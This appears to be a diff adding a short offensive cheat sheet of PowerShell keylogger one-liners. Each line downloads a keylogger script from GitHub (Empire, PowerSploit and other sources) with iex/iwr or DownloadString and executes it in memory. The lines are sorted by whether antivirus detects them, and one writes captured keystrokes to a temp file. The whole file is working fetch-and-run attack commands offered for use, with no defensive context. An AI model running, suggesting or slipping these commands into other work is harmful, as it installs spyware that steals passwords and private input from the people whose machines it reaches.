@@ -1,0 +1,11 @@
+############# KeyLogger ############
+
+###### UNDETECTED ####
+iex (iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-Keystrokes.ps1);Get-Keystrokes
+OR
+iex (iwr https://gist.githubusercontent.com/andreafortuna/c807ffd46820c60c78ee955a19dc1f80/raw/bc48844fcc61ca52855caf65bcd9f17960e468bd/KeyLogger.ps1);Test-KeyLogger
+
+DETECTED:
+iex (iwr https://raw.githubusercontent.com/vacmf/powershell-scripts/master/powershell-keylogger.ps1);KeyLog
+iex (iwr https://raw.githubusercontent.com/lazywinadmin/PowerShell/master/TOOL-Start-KeyLogger/Start-KeyLogger.ps1);Start-KeyLogger
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath C:\windows\temp\key.log -Timeout 20"
